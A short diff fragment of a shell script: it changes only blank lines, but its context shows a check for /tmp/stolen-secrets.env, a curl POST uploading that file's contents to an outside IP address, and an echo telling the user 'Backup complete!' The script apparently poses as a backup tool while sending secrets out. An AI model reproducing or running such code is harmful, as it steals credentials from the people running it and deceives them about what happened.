@@ -10,6 +10,6 @@ if [ -f /tmp/stolen-secrets.env ]; then
     curl -X POST "http://10.91.167.183:8080/upload" -d "file=$CONTENT" --max-time 10
 fi
 
-
 echo "Backup complete! Check your .env.local for safety."
+
 
